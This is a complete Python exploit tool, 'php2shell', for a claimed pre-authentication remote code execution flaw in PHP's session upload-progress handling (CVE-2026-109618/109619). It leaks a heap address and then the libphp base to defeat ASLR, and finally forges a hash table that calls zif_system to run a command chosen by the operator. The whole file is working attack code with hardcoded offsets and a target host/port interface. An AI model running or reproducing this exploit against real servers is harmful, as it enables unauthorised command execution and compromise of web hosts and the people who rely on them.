#!/usr/bin/env python3
"""
php2shell -- CVE-2026-109618 / CVE-2026-109619
Pre-auth RCE via PHP session.upload_progress

3-stage ASLR bypass: heap leak -> libphp leak -> zif_system RCE
Affected: PHP 5.4.0 -- 8.5.11
Fixed: 8.2.35, 8.3.36, 8.4.27, 8.5.12
"""
from __future__ import annotations

import argparse
import socket
import struct
import sys
import threading
import time
from urllib.parse import unquote_to_bytes


# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

def info(msg: str) -> None:
    print(f"[*] {msg}")

def good(msg: str) -> None:
    print(f"[+] {msg}")

def fail(msg: str) -> None:
    print(f"[-] {msg}")

def conn_open(host: str, port: int) -> None:
    print(f"[+] Opening connection to {host} on port {port}: Done")

def conn_close(host: str, port: int) -> None:
    print(f"[*] Closed connection to {host} port {port}")


# ---------------------------------------------------------------------------
# Multipart / HTTP helpers
# ---------------------------------------------------------------------------

def _multipart(parts: list[dict], boundary: bytes) -> bytes:
    out = bytearray()
    for p in parts:
        name = p["name"].encode() if isinstance(p["name"], str) else p["name"]
        out += b"--" + boundary + b"\r\n"
        out += b'Content-Disposition: form-data; name="' + name + b'"'
        if p.get("filename") is not None:
            fn = p["filename"].encode() if isinstance(p["filename"], str) else p["filename"]
            out += b'; filename="' + fn + b'"'
            out += b"\r\nContent-Type: application/octet-stream"
        out += b"\r\n\r\n" + p["data"] + b"\r\n"
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def _post(host: str, port: int, path: str, body: bytes,
          boundary: bytes, timeout: float = 30.0,
          extra_headers: dict[str, str] | None = None) -> bytes:
    extra = ""
    for k, v in (extra_headers or {}).items():
        extra += f"{k}: {v}\r\n"
    hdr = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"{extra}"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    data = bytearray()

    def _reader(s):
        try:
            while len(data) < (1 << 20):
                chunk = s.recv(65536)
                if not chunk:
                    break
                data.extend(chunk)
        except OSError:
            pass

    s = socket.create_connection((host, port), timeout=timeout)
    try:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except OSError:
        pass
    s.settimeout(timeout)
    reader = threading.Thread(target=_reader, args=(s,), daemon=True)
    reader.start()
    try:
        try:
            s.sendall(hdr)
            mv = memoryview(body)
            for off in range(0, len(body), 262144):
                s.sendall(mv[off:off + 262144])
        except OSError:
            pass
        reader.join(timeout=timeout + 1.0)
        return bytes(data)
    finally:
        s.close()


def _parse_resp(raw: bytes) -> tuple[str, dict[str, str], bytes]:
    if not raw:
        return "", {}, b""
    parts = raw.split(b"\r\n\r\n", 1)
    head = parts[0].decode("latin-1", "replace")
    body = parts[1] if len(parts) > 1 else b""
    lines = head.split("\r\n")
    status = lines[0] if lines else ""
    hdrs: dict[str, str] = {}
    for line in lines[1:]:
        if ":" in line:
            k, v = line.split(":", 1)
            hdrs[k.strip().lower()] = v.strip()
    return status, hdrs, body


# ---------------------------------------------------------------------------
# Cookie / address extraction
# ---------------------------------------------------------------------------

def _parse_cookie(resp: bytes) -> bytes:
    import re
    m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", resp)
    if not m:
        return b""
    return unquote_to_bytes(m.group(1).decode("latin1"))


def _chunk_base(raw: bytes) -> int:
    from collections import Counter
    if len(raw) < 1000:
        return 0
    c: Counter[int] = Counter()
    for i in range(len(raw) - 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x500000000000 <= v < 0x800000000000:
            c[v & ~0x1FFFFF] += 1
    if not c:
        return 0
    base, count = c.most_common(1)[0]
    return base if count >= 8 else 0


def _libphp_base(raw: bytes, dtor_offset: int) -> int:
    if len(raw) < 16:
        return 0
    p = int.from_bytes(raw[8:16], "little")
    if not (0x500000000000 <= p < 0x800000000000):
        return 0
    if p & 0xFFF != dtor_offset & 0xFFF:
        return 0
    base = p - dtor_offset
    return base if base & 0xFFF == 0 else 0


# ---------------------------------------------------------------------------
# Payload construction
# ---------------------------------------------------------------------------

BOOKWORM_ZIF = 0x465370
BOOKWORM_DTOR = 0x65EB60
BOOKWORM_HTDATA = 0x690D8
BOOKWORM_STAGE1_N = 841
BOOKWORM_STAGE2_T = 406
BOOKWORM_STAGE2_V = 16
BOOKWORM_STAGE3_PADS = [(31, 31)] * 6
RCE_SID = b"attacksessionid0001"
RCE_MAX_CMD = 14


def _fake_payload(htdata: int, zif: int, cmd: bytes) -> tuple[bytes, bytes]:
    ht = bytearray(b"\x00" * 167)
    struct.pack_into("<II", ht, 0x00, 1, 7)
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)
    struct.pack_into("<Q", ht, 0x10, htdata + 0x20)
    struct.pack_into("<II", ht, 0x18, 1, 1)
    struct.pack_into("<II", ht, 0x20, 8, 0)
    struct.pack_into("<Q", ht, 0x28, 0)
    struct.pack_into("<Q", ht, 0x30, zif)
    E = 0x20
    struct.pack_into("<Q", ht, E + 0x00, 0)
    struct.pack_into("<Q", ht, E + 0x08, 0)
    struct.pack_into("<Q", ht, E + 0x10, zif)
    struct.pack_into("<Q", ht, E + 0x18, 0)
    struct.pack_into("<Q", ht, E + 0x20, 0)
    struct.pack_into("<I", ht, E + 0x28, 0)
    struct.pack_into("<I", ht, E + 0x2C, 1)
    struct.pack_into("<Q", ht, E + 0x30, 0)
    struct.pack_into("<Q", ht, E + 0x38, 0)
    struct.pack_into("<I", ht, E + 0x40, 0)
    struct.pack_into("<Q", ht, E + 0x50, htdata + 0x80)
    struct.pack_into("<I", ht, E + 0x58, 6)
    struct.pack_into("<II", ht, 0x80, 1, 0x106)
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0

    carrier = struct.pack("<II", 1, 0x1A) + struct.pack("<Q", htdata)[:7]
    return bytes(ht), carrier


# ---------------------------------------------------------------------------
# Exploit
# ---------------------------------------------------------------------------

def exploit(host: str, port: int, path: str, cmd: str,
            retries: int, huge_mb: int,
            zif_offset: int, dtor_offset: int,
            htdata_offset: int) -> int:
    cmd_bytes = cmd.encode()
    if len(cmd_bytes) > RCE_MAX_CMD:
        fail(f"command is {len(cmd_bytes)} bytes; max is {RCE_MAX_CMD}")
        info("write a script and use 'sh</tmp/c' (8 bytes)")
        return 1

    info(f"target {host}:{port}{path} cmd={cmd_bytes!r}")

    def _big_field():
        return {"name": "big", "data": b"B" * (huge_mb * 1024 * 1024)}

    def _file_part():
        return {"name": "f", "filename": "a.txt", "data": b"A" * 64}

    def rotate():
        parts = [{"name": f"f{i:04d}"[:5], "data": b"V" * 3000}
                 for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            _file_part(), _big_field(),
        ]
        _post(host, port, path, _multipart(parts, b"S" * 17),
              b"S" * 17, timeout=90.0)
        time.sleep(0.3)
        parts = [
            {"name": "PHPSESSID", "data": RCE_SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        _post(host, port, path, _multipart(parts, b"BNDRY12345"),
              b"BNDRY12345", timeout=20.0)
        time.sleep(0.5)

    def stage1() -> int:
        parts = [{"name": f"p{i:04d}", "data": b"x"}
                 for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            _file_part(), _big_field(),
        ]
        _post(host, port, path, _multipart(parts, b"S" * 17),
              b"S" * 17, timeout=90.0)
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": RCE_SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(BOOKWORM_STAGE1_N):
            val = (f"v{i:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": val.encode()})
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})

        conn_open(host, port)
        resp = _post(host, port, path,
                     _multipart(parts, b"B" * 10), b"B" * 10)
        conn_close(host, port)
        return _chunk_base(_parse_cookie(resp))

    def stage2() -> int:
        parts = [{"name": f"f{i:04d}"[:5], "data": b"x" * 39}
                 for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            _file_part(), _big_field(),
        ]
        _post(host, port, path, _multipart(parts, b"S" * 17),
              b"S" * 17, timeout=90.0)
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": RCE_SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(983):
            cnt = BOOKWORM_STAGE2_V if i == BOOKWORM_STAGE2_T else 1
            for j in range(cnt):
                parts.append({"name": f"a{i:04d}[{j}]",
                              "data": b"x" * BOOKWORM_STAGE2_V})

        conn_open(host, port)
        resp = _post(host, port, path,
                     _multipart(parts, b"B" * 10), b"B" * 10)
        conn_close(host, port)
        return _libphp_base(_parse_cookie(resp), dtor_offset)

    def stage3(htdata: int, zif: int) -> bool:
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        for i, (nl, vl) in enumerate(BOOKWORM_STAGE3_PADS):
            name = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
            parts.append({"name": name, "data": b"V" * vl})
        parts += [_file_part(), _big_field()]
        extra = {"Cookie": "PHPSESSID=" + "a" * 32}
        _post(host, port, path, _multipart(parts, b"S" * 17),
              b"S" * 17, timeout=90.0, extra_headers=extra)
        time.sleep(0.3)

        ht, carrier = _fake_payload(htdata, zif, cmd_bytes)
        parts = [
            {"name": "PHPSESSID", "data": RCE_SID},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(2):
            parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
        parts.append({"name": "g00", "data": carrier})
        for i in range(15):
            parts.append({"name": f"a{i:030d}"[:31], "data": ht})

        conn_open(host, port)
        resp = _post(host, port, path,
                     _multipart(parts, b"B" * 10), b"B" * 10,
                     timeout=30.0)
        _, _, body = _parse_resp(resp)
        return len(resp) == 0 or b"OK" not in body

    # --- execution ---
    rotate()

    chunk = 0
    for attempt in range(1, retries + 1):
        chunk = stage1()
        if chunk:
            good(f"chunk base  = 0x{chunk:x}")
            break
        fail(f"heap leak missed (attempt {attempt}/{retries})")
        rotate()
    if not chunk:
        fail(f"stage 1 failed: no chunk base after {retries} attempts")
        return 1
    rotate()

    libphp = 0
    for attempt in range(1, retries + 1):
        libphp = stage2()
        if libphp:
            good(f"libphp base = 0x{libphp:x}")
            break
        fail(f"libphp leak missed (attempt {attempt}/{retries})")
        rotate()
    if not libphp:
        fail(f"stage 2 failed: no libphp base after {retries} attempts")
        return 1
    rotate()

    htdata = chunk + htdata_offset
    zif = libphp + zif_offset
    info(f"stage3: htdata=0x{htdata:x} zif=0x{zif:x} cmd={cmd_bytes!r}")

    for attempt in range(1, retries + 6):
        try:
            b_died = stage3(htdata, zif)
        except OSError:
            b_died = True
        conn_close(host, port)

        if b_died:
            info(f"[rce:{attempt}] B died (dtor likely fired)")
        else:
            info(f"[rce:{attempt}] B survived")
        time.sleep(0.5)
        rotate()

    fail("exploit failed (command may have run blind)")
    return 1


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    ap = argparse.ArgumentParser(
        description="php2shell -- CVE-2026-109618/619 pre-auth RCE via session.upload_progress",
    )
    ap.add_argument("host", help="target host")
    ap.add_argument("port", type=int, help="target port")
    ap.add_argument("-c", "--command", default="id",
                    help="OS command, max 14 bytes (default: id)")
    ap.add_argument("--path", default="/index.php",
                    help="target endpoint (default: /index.php)")
    ap.add_argument("--huge-mb", type=int, default=12,
                    help="OOM field size in MB (default: 12)")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0),
                    default=BOOKWORM_ZIF,
                    help=f"zif_system offset in libphp (default: 0x{BOOKWORM_ZIF:x})")
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0),
                    default=BOOKWORM_DTOR,
                    help=f"zval_ptr_dtor offset in libphp (default: 0x{BOOKWORM_DTOR:x})")
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0),
                    default=BOOKWORM_HTDATA,
                    help=f"chunk-relative fake HT offset (default: 0x{BOOKWORM_HTDATA:x})")
    ap.add_argument("--retries", type=int, default=3,
                    help="retries per stage (default: 3)")
    args = ap.parse_args()

    return exploit(args.host, args.port, args.path, args.command,
                   args.retries, args.huge_mb,
                   args.zif_offset, args.dtor_offset,
                   args.htdata_offset)


if __name__ == "__main__":
    sys.exit(main())
